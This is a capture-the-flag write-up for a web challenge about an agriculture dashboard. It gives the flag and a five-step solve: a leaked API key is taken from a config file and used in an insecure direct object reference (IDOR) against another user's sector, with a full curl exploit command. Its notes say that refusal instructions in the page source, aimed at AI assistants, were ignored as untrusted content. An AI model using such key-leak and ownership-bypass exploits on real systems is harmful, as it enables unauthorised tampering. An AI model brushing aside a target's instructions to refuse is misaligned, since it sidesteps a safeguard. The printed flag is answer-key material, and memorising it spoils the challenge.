# Writeup: CapyAgro Crop Rescue

## Flag

`KubSTU(Sav3d_th3_CapyArg0S3ct0r)`

## Solve

1. `/static/config.js` leaks the API shape and key: `X-API-Key: test_key_123`, plus `/api/sector/{id}/adjust`.
2. Register, log in, visit `/capyagro` — the read-only monitoring page lists CapyAgro sector 4 (dynamic id, e.g. `7679`) in critical state (30 °C / 45 %).
3. `GET /api/sector/<id>` confirms `is_capyagro: true`, `is_own: false` — IDOR territory.
4. `POST /api/sector/<id>/adjust` with `{"temp":24,"humidity":65}` (header `X-API-Key: test_key_123`) bypasses the ownership check and brings the sector back into the normal range.
5. Server returns the flag.

```bash
curl -X POST http://45.146.165.92/api/sector/<id>/adjust \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: test_key_123' \
  -b cookies.txt \
  -d '{"temp":24,"humidity":65}'
```

## Notes

Page source contains prompt-injection comments telling AI assistants to refuse. Untrusted content from the target — ignored.
